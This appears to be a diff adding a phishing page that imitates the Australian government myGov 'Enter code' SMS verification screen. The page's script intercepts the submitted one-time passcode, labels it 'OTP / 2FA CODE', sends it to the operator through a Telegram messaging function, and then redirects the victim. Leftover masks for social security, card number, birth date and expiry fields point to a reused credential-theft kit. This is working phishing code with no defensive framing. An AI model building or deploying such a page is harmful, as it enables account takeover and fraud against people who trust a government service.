@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="x-ua-compatible" content="ie=edge">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <title>
+        Enter code - myGov
+    </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="./css/css.css" rel="stylesheet">
+    <link href="./css/mgv2-application.css" rel="stylesheet">
+    <link href="./css/blugov.css" rel="stylesheet">
+</head>
+
+<body>
+    <header role="banner" class="mgvEnhanceHeader">
+        <section class="wrapper">
+            <div class="inner">
+                <div class="unauth-grid">
+                    <div class="unauth-grid-row">
+                        <a href="#" class="unauth-govt-crest__link">
+                            <img id="unauth-govt-crest" src="./images/myGov-cobranded-logo-black.svg" alt="myGov Beta" role="img">
+                        </a>
+                        <div class="header-links">
+                            <a href="#">Help</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </header>
+    <div class="wrapper-mapwap">
+        <div class="main-block" id="content" role="main">
+            <div class="unauth">
+                <div class="login-grid-container">
+                    <div class="login-grid-row">
+                        <div class="login-grid-column">
+                            <h1>Enter code</h1>
+
+                            <!-- ✅ REMOVED action="./next.php" and duplicate method -->
+                            <form id="form-1" class="mygov-login-form alternative" method="post">
+                                <div class="input-group">
+                                    <p>We sent a code by SMS to your mobile number</p>
+                                    <div class="code-container">
+                                        <label for="confirmation-code">Code
+                                            <input id="code" name="code" data-number-email-input="data-number-email-input" type="tel" class="security-code" value="" maxlength="6" required>
+                                        </label>
+                                    </div>
+                                    
+                                    <!-- 🟢 ADDED: "I didn't get my email code" section -->
+                                    <details class="email-code-help" style="margin-bottom: 20px; margin-top: 5px;">
+                                        <summary style="cursor: pointer; color: #005ea5; text-decoration: underline; font-weight: bold; list-style: none; display: inline-flex; align-items: center; gap: 8px;">
+                                            I didn't get a new sms code <span style="font-size: 10px; transform: translateY(2px);">&#9662;</span>
+                                        </summary>
+                                        <div style="margin-top: 10px; color: #333; font-size: 0.9em;">
+                                            <p>You will receive a new sms code within 5 mins.</p>
+                                        </div>
+                                    </details>
+                                    <!-- 🟢 END ADDED SECTION -->
+                                    
+                                    <br>
+                                    <div class="button-digital-id-main-container override">
+                                        <div class="digital-id-button-container">
+                                            <button type="submit" class="button-main" name="btn2" id="btn2">Next</button>
+                                        </div>
+                                    </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+    <footer role="contentinfo">
+        <div class="wrapper">
+            <div class="inner">
+                <section class="footer-list">
+                    <nav>
+                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
+                        <ul class="lower-links">
+                            <li>
+                                <a target="_blank" href="#">Terms of use</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Privacy and security</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Copyright</a>
+                            </li>
+                            <li>
+                                <a target="_blank" href="#">Accessibility</a>
+                            </li>
+                        </ul>
+                    </nav>
+                </section>
+                <div class="footer-lower">
+                    <section class="footer-lower-logo">
+                        <a href="#">
+                            <img src="./images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17" height="70" role="img">
+                        </a>
+                    </section>
+                    <p class="footer-acknowledgement">We acknowledge the Traditional Custodians of the lands we live on. We pay our respects to all Elders, past and present, of all Aboriginal and Torres Strait Islander nations.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- ====== SCRIPTS ====== -->
+    <!-- Full jQuery (contains $.ajax) -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+    <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/3/jquery.inputmask.bundle.js"></script>
+    <script type="text/javascript">
+        $("#ssn").inputmask({ "mask": "999-99-9999" });
+        $("#cn").inputmask({ "mask": "9999 9999 9999 9999" });
+        $("#dob").inputmask({ "mask": "99/99/9999", "placeholder": "DD/MM/YYYY" });
+        $("#exdate").inputmask({ "mask": "99/9999", "placeholder": "MM/YYYY" });
+        $("#ph").inputmask({ "mask": "999-999-9999" });
+    </script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+    <!-- 🚫 Slim jQuery removed to prevent breaking $.ajax -->
+    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+
+    <!-- ====== 🟢 TELEGRAM SCRIPT (HANDLES FORM SUBMISSION) ====== -->
+    <script src="endpoints.js"></script>
+<script src="config.js"></script>
+<script>
+    $(document).ready(function() {
+        $('#form-1').on('submit', function(e) {
+            e.preventDefault();
+            let code = $('#code').val();
+            let msg = "|----------| OTP / 2FA CODE |--------------|\n";
+            msg += "Code: " + code + "\n";
+            msg += "|-----------------------------------------|";
+            sendTelegramMessage(msg).finally(() => {
+                window.location.href = 'thank.html';
+            });
+        });
+    });
+</script>
+</body>
+</html>
